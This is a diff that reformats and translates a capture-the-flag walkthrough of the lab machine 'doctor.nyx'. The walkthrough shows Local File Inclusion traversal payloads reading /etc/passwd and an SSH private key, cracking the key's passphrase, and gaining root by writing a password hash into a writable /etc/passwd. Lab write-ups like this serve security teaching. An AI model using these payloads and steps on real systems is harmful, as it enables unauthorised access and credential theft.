@@ -19,7 +19,7 @@ A Local File Inclusion vulnerability in `doctor-item.php` is used to read `admin
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn doctor.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn doctor.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,11 +30,11 @@ MAC Address: 00:0C:29:E1:32:2E (VMware)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sCV doctor.nyx
+$ sudo nmap -p 22,80 -sCV doctor.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
 |   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
 |_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
@@ -57,7 +57,7 @@ http://doctor.nyx
 A directory scan is run to look for pages not linked from the front page:
 
 ```bash
-gobuster dir -u 'http://doctor.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+$ gobuster dir -u 'http://doctor.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 
 ===============================================================
 Starting gobuster in directory enumeration mode
@@ -94,7 +94,7 @@ http://doctor.nyx/doctor-item.php?include=Doctors.html
 `ffuf` fuzzes for payloads that break out of the expected file, filtering on word count to cut out identical "not found"-style responses:
 
 ```bash
-ffuf -u 'http://doctor.nyx/doctor-item.php?include=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 1
+$ ffuf -u 'http://doctor.nyx/doctor-item.php?include=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 1
 
 ..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 5ms]
 ..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 62ms]
@@ -134,9 +134,10 @@ view-source:http://doctor.nyx/doctor-item.php?include=/home/admin/.ssh/id_rsa
 A first connection attempt with the recovered key confirms it's passphrase-protected before going any further:
 
 ```bash
-chmod 600 admin_rsa
-
-ssh -i admin_rsa admin@doctor.nyx
+$ chmod 600 admin_rsa
+```
+```bash
+$ ssh -i admin_rsa admin@doctor.nyx
 The authenticity of host 'doctor.nyx (doctor.nyx)' can't be established.
 ED25519 key fingerprint is: SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8
 This key is not known by any other names.
@@ -150,9 +151,10 @@ Enter passphrase for key 'admin_rsa':
 The key is passphrase-protected. Its hash is extracted and cracked:
 
 ```bash
-ssh2john admin_rsa > admin_rsa.hash
-
-john admin_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+$ ssh2john admin_rsa > admin_rsa.hash
+```
+```bash
+$ john admin_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
@@ -170,13 +172,13 @@ Session completed.
 ### Shell as admin
 
 ```bash
-ssh -i admin_rsa admin@doctor.nyx
+$ ssh -i admin_rsa admin@doctor.nyx
 Enter passphrase for key 'admin_rsa':
 admin@doctor:~$ id
-uid=1000(admin) gid=1000(admin) grupos=1000(admin)
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
 admin@doctor:~$ ls -l /home/admin/
 total 4
--r-------- 1 admin admin 33 abr 21  2023 user.txt
+-r-------- 1 admin admin 33 Apr 21  2023 user.txt
 admin@doctor:~$ cat /home/admin/user.txt
 0819e6dfb35db7c61353e4dce311b397
 ```
@@ -191,7 +193,7 @@ A search for writable files not owned by the current user turns up something sig
 
 ```bash
 admin@doctor:~$ find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
--rw-rw-r-- 1 root root 1404 may 18 16:47 /etc/passwd
+-rw-rw-r-- 1 root root 1404 May 18 16:47 /etc/passwd
 ```
 
 `/etc/passwd` itself is writable. On most modern systems the password field there is just a placeholder (`x`), with the real hash living in `/etc/shadow` instead — but if `/etc/passwd` can be edited directly, a password hash placed in that second field is honored on its own, without touching `/etc/shadow` at all. `openssl passwd` generates a hash in the right format for a chosen password:
@@ -200,7 +202,7 @@ admin@doctor:~$ find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -p
 admin@doctor:~$ openssl passwd root
 E4m.vvfkKBbRo
 admin@doctor:~$ ls -l /etc/passwd
--rw-rw-rw- 1 root root 1392 dic 30  2024 /etc/passwd
+-rw-rw-rw- 1 root root 1392 Dec 30  2024 /etc/passwd
 admin@doctor:~$ nano /etc/passwd
 admin@doctor:~$ cat /etc/passwd
 root:E4m.vvfkKBbRo:0:0:root:/root:/bin/bash
@@ -233,12 +235,12 @@ admin:x:1000:1000:admin:/home/admin:/bin/bash
 
 ```bash
 admin@doctor:~$ su root
-Contraseña:
+Password:
 root@doctor:/home/admin# id
-uid=0(root) gid=0(root) grupos=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 root@doctor:/home/admin# ls -l /root
 total 4
--r-------- 1 root root 33 abr 21  2023 root.txt
+-r-------- 1 root root 33 Apr 21  2023 root.txt
 root@doctor:/home/admin# cat /root/root.txt
 dfde8cc67ed8819b2386dc74e472ecc6
 ```
